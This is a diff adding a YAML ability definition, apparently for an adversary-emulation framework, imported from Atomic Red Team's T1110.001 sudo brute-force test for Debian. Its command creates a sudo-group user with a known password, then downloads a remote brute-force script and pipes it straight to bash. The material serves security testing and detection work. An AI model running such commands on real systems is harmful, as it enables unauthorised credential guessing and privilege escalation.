@@ -1,0 +1,64 @@
+- id: ba1bf0b6-f32b-4db0-b7cc-d78cacc76700
+  name: SUDO Brute Force - Debian
+  description: "An adversary may find themselves on a box (e.g. via ssh key auth,\
+    \ with no password) with a user that has sudo'ers privileges, but they do not\
+    \ know the users password. Normally, failed attempts to access root will not cause\
+    \ the root account to become locked, to prevent denial-of-service. This functionality\
+    \ enables an attacker to undertake a local brute force password guessing attack\
+    \ without locking out the root user. \n\nThis test creates the \"art\" user with\
+    \ a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh\
+    \ which brute force guesses the password, then deletes the user"
+  tactic: credential-access
+  technique:
+    attack_id: T1110.001
+    name: 'Brute Force: Password Guessing'
+  platforms:
+    linux:
+      sh:
+        command: useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123)
+          art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+          | bash" art
+        cleanup: userdel -fr art
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1110.001
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      remote_url:
+        description: url of remote payload
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+    dependencies:
+    - description: 'Check if running on a Debian based machine.
+
+        '
+      prereq_command: 'if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release;
+        then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+
+        if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit
+        1; fi
+
+        if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else
+        echo "openssl is NOT installed"; exit 1; fi
+
+        if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo
+        is NOT installed"; exit 1; fi
+
+        if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl
+        is NOT installed"; exit 1; fi
+
+        '
+      get_prereq_command: 'apt update && apt install -y openssl sudo curl
+
+        '
+    technique_created: '2020-02-11T18:38:22.617Z'
+    atomic_guid: ba1bf0b6-f32b-4db0-b7cc-d78cacc76700
+    import_timestamp: '2025-06-24T11:15:56.399577Z'
